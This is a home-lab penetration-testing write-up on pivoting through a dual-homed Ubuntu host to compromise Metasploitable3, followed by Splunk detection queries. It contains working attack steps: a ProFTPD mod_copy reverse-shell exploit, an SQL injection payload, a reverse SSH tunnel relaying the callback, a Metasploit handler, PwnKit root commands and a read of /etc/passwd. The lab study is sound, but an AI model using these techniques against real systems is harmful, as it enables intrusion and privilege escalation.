# Phase 4: Lateral Movement

**Goal:** Reach Metasploitable3 (`192.168.200.10`) from Kali. The only path is through the Ubuntu pivot.

This phase took days. And the reason it matters isn't the exploit at the end. It's everything that failed first, and the moment I stopped looking for a new exploit and started thinking about the actual problem. I came up with the solution myself.

---

## Red Team

### The Network Problem

Kali is on `192.168.100.x`. Metasploitable3 is on `192.168.200.x`. There is no direct route between them.

Ubuntu sits on both networks — `192.168.100.20` on the external side, `192.168.200.20` on the internal. With root on Ubuntu from Phase 3, it was the obvious pivot point. The question was how to use it.

---

### Mapping the Internal Network

From the root shell on Ubuntu, I swept the internal subnet to find what was actually there:

```bash
for i in $(seq 1 254); do ping -c 1 -W 1 192.168.200.$i | grep '64 bytes' & done; wait
```

![Ping sweep of 192.168.200.0/24 — responses from .10 (Metasploitable3) and .20 (Ubuntu itself)](../screenshots/phase4-internal-ping-sweep.png)

Two hosts responded:

| IP | Notes |
|---|---|
| 192.168.200.10 | Metasploitable3 |
| 192.168.200.20 | Ubuntu (self) |

With a target confirmed, I enumerated services on Metasploitable3 from the Ubuntu pivot:

| Port | Service | Version | Notes |
|---|---|---|---|
| 21 | FTP | ProFTPD 1.3.5 | mod_copy exploit (CVE-2015-3306) |
| 80 | HTTP | Apache | Payroll web application |
| 445 | SMB | Samba | File sharing |

---

### What I Tried First (And Why It Failed)

#### SMB — Dead End

The original plan was to exploit Samba over the SSH tunnel and get a shell. That died immediately. The Samba version on Metasploitable3 was patched against the exploits I had available. First dead end.

---

#### ProFTPD mod_copy — The Exploit That Worked and Didn't Work

ProFTPD 1.3.5 is vulnerable to CVE-2015-3306 — unauthenticated SITE CPFR/CPTO commands that let you copy any file on the server. I used this to write a PHP reverse shell into the web root.

The exploit connected. The shell landed. And then nothing happened.

I sat there watching the handler and got no callback. I ran it again. Nothing.

It took a while to understand why. A reverse shell means the *target* initiates the connection back to the attacker. Metasploitable3 is on `192.168.200.x`. It has no route to Kali on `192.168.100.x`. The shell executed, tried to call home, found no path, and died silently. The exploit worked perfectly. The network made it useless.

I filed that away and moved on.

---

#### Drupal — Version Mismatch

Metasploitable3 runs Drupal 7.5 from 2011. Drupalgeddon2 targets Drupal 7.x, so it looked promising. But MS3's version predates the vulnerability entirely — the attack surface doesn't exist there. Dead end.

---

#### SQL Injection in payroll_app.php — Real Vulnerability, Blocked Exit

A payroll application running at `http://192.168.200.10/payroll_app.php` was accessible from the Ubuntu pivot. Default credentials `admin / admin` granted login.

![Payroll app on Metasploitable3 — logged in as admin, showing employee salary table](../screenshots/phase4-payroll-app.png)

Digging further into the login form, I found a SQL injection vulnerability and confirmed it manually in Burp Suite. Sending `' OR 1=1-- -` as the username caused the entire database to dump — Star Wars character names, salaries, all of it.

![Burp Suite intercepting POST to /payroll_app.php — user=admin&password=admin submitted in cleartext](../screenshots/phase4-burp-intercept.png)

The injection was real. I tried to weaponize it — using MySQL's `INTO OUTFILE` to write a PHP shell directly to the web root. That failed. MySQL had `secure_file_priv` set to a restricted directory that Apache doesn't serve. The database couldn't write to where the web server would execute it.

I also tried SQLmap to automate the injection. Despite having already proven the vulnerability by hand, SQLmap kept flagging it as a false positive and refused to exploit it. The tool was wrong. The vulnerability was real. But neither path got me a shell.

---

#### FTP Brute Force — Nothing

Ran Hydra against ProFTPD. Got nothing useful.

---

#### Proxychains — Hours of Silent Failure

At some point during all of this I was trying to route traffic through an SSH tunnel using Proxychains. Proxychains is a tool that forces a program's TCP connections through a proxy — in this case, the SOCKS proxy created by the `-D` flag on an SSH connection. A SOCKS proxy lets you tunnel arbitrary TCP traffic through an intermediary, which is how you reach a network segment that you can't route to directly.

The problem: Proxychains was configured to use port `9050` — Tor's default. My SSH SOCKS proxy was on port `1080`. Every connection I routed through Proxychains had been silently timing out for hours because it was pointed at nothing.

Finding that was both a relief and genuinely infuriating.

---

### The Actual Solution

After all of that, I stopped looking for a new exploit and actually thought about the network.

The constraint wasn't the target. The constraint was the callback path. Every reverse shell I could get to run on Metasploitable3 would try to connect back to Kali — and MS3 has no route to Kali. That's why the ProFTPD shell died. That would be why any reverse shell died.

But MS3 *can* reach Ubuntu. I have root on Ubuntu. And Ubuntu can reach Kali.

What if the shell called back to Ubuntu instead of Kali? And what if Ubuntu was configured to forward that connection to Kali automatically?

Nobody told me this. I worked it out from what I understood about the network topology. That's reverse port forwarding.

**How it works:** Instead of Kali pushing a tunnel to Ubuntu (local forward), Ubuntu pushes a tunnel to Kali (reverse forward). The `-R` flag tells the SSH server — Ubuntu — to listen on a port and forward any connection it receives back through the SSH session to Kali. If Ubuntu listens on `192.168.200.20:4444` and MS3 calls back there, Ubuntu relays the connection to Kali's handler. From MS3's perspective, it's talking to Ubuntu. From Kali's perspective, it's receiving the shell.

There was one catch: by default, SSH only binds reverse-forwarded ports on `127.0.0.1` — meaning nothing outside the machine could connect to it. Ubuntu needed to bind on `0.0.0.0` so that MS3 could actually reach it. That required enabling `GatewayPorts yes` in Ubuntu's `sshd_config`.

---

### Setting Up the Reverse Tunnel

On Ubuntu, enabled `GatewayPorts`:

```
# /etc/ssh/sshd_config
GatewayPorts yes
```

Restarted sshd, then established the reverse tunnel from Kali:

```bash
ssh -i ~/pivot_key -R 4444:127.0.0.1:4444 root@192.168.100.20 -N &
```

This tells Ubuntu to listen on port `4444` on all interfaces and forward incoming connections back through the SSH session to port `4444` on Kali. Confirmed Ubuntu was binding correctly:

```bash
ss -tlnp | grep 4444
# LISTEN 0  128  0.0.0.0:4444  0.0.0.0:*
```

![Reverse SSH tunnel established — Ubuntu bound on 0.0.0.0:4444, forwarding to Kali handler](../screenshots/phase4-ssh-tunnel.png)

---

### Exploit Metasploitable3 (For Real This Time)

Ran the ProFTPD mod_copy exploit again — same exploit that had worked before — but this time the reverse shell payload was configured to call back to `192.168.200.20` (Ubuntu's internal address) on port `4444`. MS3 can reach that. The handler on Kali was waiting at the other end of the tunnel.

![Metasploit ProFTPD modcopy exploit — connected to FTP, sent copy commands, placed PHP payload at /var/www/html/qtvcGn.php](../screenshots/phase4-proftpd-exploit.png)

A `multi/handler` on Kali caught the callback:

```
use exploit/multi/handler
set payload cmd/unix/reverse_perl
set LHOST 127.0.0.1
set LPORT 4444
run
```

![Metasploit multi/handler — Command shell session 1 opened; whoami → www-data, hostname → metasploitable3-ub1404](../screenshots/phase4-msf-shell.png)

**Shell received as:** `www-data@metasploitable3-ub1404`

I genuinely could not believe it worked. I looked at what I had, understood the constraint, and designed a solution myself. No AI. No hints.

---

### Privilege Escalation on Metasploitable3 — PwnKit (CVE-2021-4034)

Metasploitable3 runs Ubuntu 14.04 with a vulnerable version of `pkexec`. The public PwnKit exploit compiles and runs in seconds:

```bash
cd /tmp
unzip main.zip
cd CVE-2021-4034-main
make
./cve-2021-4034
# whoami → root
```

![CVE-2021-4034 (PwnKit) compiled and executed on Metasploitable3 — www-data escalated to root](../screenshots/phase4-pwnkit-root.png)

---

### Post-Exploitation — User Enumeration

```bash
cat /etc/passwd
```

![/etc/passwd on Metasploitable3 — Star Wars-themed user accounts pre-populated by Rapid7 (leia_organa, luke_skywalker, han_solo, darth_vader, etc.)](../screenshots/phase4-passwd-enum.png)

---

## Blue Team — What Splunk Saw

### Detection Queries

```
index=* sourcetype=syslog "sshd" src_ip=192.168.100.10
```

```
index=* sourcetype=syslog dest_port=21
```

```
index=* sourcetype=syslog ("SITE CPFR" OR "SITE CPTO" OR "proftpd")
```

### What Fired

The SSH connection from Kali to Ubuntu appeared in Ubuntu's auth logs. The `GatewayPorts` change to `sshd_config` would appear in filesystem logs if file integrity monitoring were in place. If ProFTPD logs were forwarded to Splunk, the SITE CPFR/CPTO commands — never used in normal FTP operations — would be a high-fidelity exploit indicator.

### What Was Missed

The reverse tunnel's callback traffic travels from MS3 to Ubuntu and then encrypted through SSH to Kali. Splunk sees an SSH session and a connection from MS3 to Ubuntu's port `4444` — not a shell. The ProFTPD exploit traffic appears to originate from Ubuntu (`192.168.200.20`) from MS3's perspective, masking Kali as the true source. PwnKit leaves no syslog entry — detecting it requires process-level auditing with auditd.

---

## Key Takeaways

- **The network was the obstacle, not the target.** Metasploitable3 had multiple exploitable services. The real problem was that any shell it launched couldn't reach Kali. Every failed attempt was actually a routing problem in disguise.
- **Tools fail. Vulnerabilities don't disappear.** SQLmap called a confirmed SQL injection a false positive. The injection was real. Understanding what you've proven manually matters more than trusting tool output blindly.
- **Reverse port forwarding solves the callback problem.** When the target can't reach you, give it something it *can* reach — and tunnel the return path through a host that sits between you. This is the core insight of this entire phase.
- **Dual-homed hosts are high-value targets.** Ubuntu sat at the boundary of both networks. With root on it, the 200.x segment was reachable regardless of how well Metasploitable3 itself was isolated.

---

← [Phase 3 — Privilege Escalation](phase3-privesc.md) | [Phase 5 — Exfiltration](phase5-exfil.md) →
